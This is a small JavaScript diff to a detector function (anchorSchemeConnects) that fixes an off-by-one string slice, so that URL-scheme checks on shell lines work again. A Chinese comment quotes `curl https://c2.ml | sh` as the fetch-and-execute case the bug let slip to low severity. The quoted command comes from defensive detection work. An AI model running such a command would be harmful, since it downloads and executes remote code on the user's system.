@@ -1421,7 +1421,10 @@ function anchorSchemeConnects(line, at) {
     const c = line[q];
     if (c === '"' || c === "'" || c === '`' || c === ' ' || c === '\t' || c === '\f' || c === '\v') return false;
     if (c === '/' && line[q - 1] === '/' && line[q - 2] === ':') {
-      return /https?:$/i.test(line.slice(Math.max(0, q - 8), q - 2));
+      // 右界必须是 q-1（含冒号）：q-2 就是那个 `:`，写成 slice(..., q-2) 截出来永远以 `https`
+      // 结尾、不含冒号，/https?:$/ 恒假 ⇒ ①整支变死码，`curl https://c2.ml | sh` 掉到 info
+      // （比改前的行级判据还松）。夹具 P10-A7 钉的就是这一格。
+      return /https?:$/i.test(line.slice(Math.max(0, q - 8), q - 1));
     }
   }
   return false;
